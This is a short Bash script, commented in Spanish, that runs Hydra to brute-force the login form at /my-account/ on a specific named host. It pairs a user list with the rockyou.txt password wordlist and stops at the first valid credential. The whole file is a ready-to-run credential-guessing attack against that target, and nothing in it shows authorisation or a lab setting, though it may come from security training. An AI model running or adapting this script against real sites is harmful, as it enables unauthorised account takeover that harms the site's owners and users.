#!/bin/bash

# Archivos y parámetros
USUARIOS="usuarios.txt"
PASSWORDS="/usr/share/wordlists/rockyou.txt"
TARGET="pascualbravo.ingejei.com"
URL_PATH="/my-account/"
POST_DATA="username=^USER^&password=^PASS^"
FAILURE_STR="Error"

# Ejecutar Hydra
hydra -L "$USUARIOS" -P "$PASSWORDS" "$TARGET" http-post-form \
"$URL_PATH:$POST_DATA:$FAILURE_STR" -V -t 4 -f
